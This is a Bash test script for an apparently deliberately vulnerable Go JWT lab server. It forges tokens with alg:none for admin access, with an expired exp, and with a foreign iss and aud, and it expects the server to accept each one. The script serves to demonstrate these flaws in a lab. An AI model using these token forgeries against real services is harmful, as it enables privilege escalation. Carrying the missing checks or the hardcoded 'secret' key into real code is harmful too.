#!/usr/bin/env bash
# Тест VULN-версии: все 4 атаки должны ПРОХОДИТЬ (это демонстрация уязвимостей).
set -u
cd "$(dirname "$0")"

PASS=0
FAIL=0

b64() { printf '%s' "$1" | base64 -w0 | tr '+/' '-_' | tr -d '='; }
sign() { printf '%s' "$1" | openssl dgst -sha256 -hmac secret -binary | base64 -w0 | tr '+/' '-_' | tr -d '='; }

check() {
	local name="$1" expect_substr="$2" actual="$3"
	if echo "$actual" | grep -q "$expect_substr"; then
		echo "  [PASS] $name"
		PASS=$((PASS+1))
	else
		echo "  [FAIL] $name"
		echo "         ожидали подстроку: $expect_substr"
		echo "         получили:          $actual"
		FAIL=$((FAIL+1))
	fi
}

echo "== Собираем и запускаем VULN сервер =="
go build -o /tmp/jwtvuln . || { echo "build failed"; exit 1; }
/tmp/jwtvuln >/tmp/jwtvuln.log 2>&1 &
SRV_PID=$!
trap 'kill $SRV_PID 2>/dev/null; wait $SRV_PID 2>/dev/null' EXIT
sleep 1

NOW=$(date +%s)
EXP_OK=$(( NOW + 900 ))
EXP_OLD=$(( NOW - 1000000 ))

echo
echo "-- Тест 0: легитимный вход --"
RESP=$(curl -s -X POST localhost:8080/login -d '{"username":"alice","password":"alice"}')
TOKEN=$(echo "$RESP" | sed -E 's/.*"access_token":"([^"]*)".*/\1/')
RESP=$(curl -s -H "Authorization: Bearer $TOKEN" localhost:8080/protected)
check "легитимный токен принят" '"role":"user"' "$RESP"

echo
echo "-- Тест 1: alg:none должен ПРОЙТИ (уязвимость) --"
H=$(b64 '{"alg":"none","typ":"JWT"}')
P=$(b64 '{"uid":2,"role":"admin"}')
RESP=$(curl -s -H "Authorization: Bearer $H.$P." localhost:8080/protected)
check "alg:none принят как admin" '"role":"admin"' "$RESP"

echo
echo "-- Тест 2: просроченный exp должен ПРОЙТИ (уязвимость) --"
H=$(b64 '{"alg":"HS256","typ":"JWT"}')
P=$(b64 "{\"uid\":2,\"role\":\"user\",\"exp\":$EXP_OLD,\"iss\":\"jwtlab-auth\",\"aud\":[\"jwtlab-api\"]}")
T="$H.$P.$(sign "$H.$P")"
RESP=$(curl -s -H "Authorization: Bearer $T" localhost:8080/protected)
check "просроченный токен принят" '"role":"user"' "$RESP"

echo
echo "-- Тест 3: чужой iss должен ПРОЙТИ (уязвимость) --"
P=$(b64 "{\"uid\":2,\"role\":\"user\",\"exp\":$EXP_OK,\"iss\":\"fake-issuer\",\"aud\":[\"jwtlab-api\"]}")
T="$H.$P.$(sign "$H.$P")"
RESP=$(curl -s -H "Authorization: Bearer $T" localhost:8080/protected)
check "чужой iss принят" '"iss":"fake-issuer"' "$RESP"

echo
echo "-- Тест 4: чужой aud должен ПРОЙТИ (уязвимость) --"
P=$(b64 "{\"uid\":2,\"role\":\"user\",\"exp\":$EXP_OK,\"iss\":\"jwtlab-auth\",\"aud\":[\"other-service\"]}")
T="$H.$P.$(sign "$H.$P")"
RESP=$(curl -s -H "Authorization: Bearer $T" localhost:8080/protected)
check "чужой aud принят" '"aud":\["other-service"\]' "$RESP"

echo
echo "===================================="
echo "VULN: PASS=$PASS FAIL=$FAIL (все 5 должны быть PASS)"
echo "===================================="
[ "$FAIL" -eq 0 ]
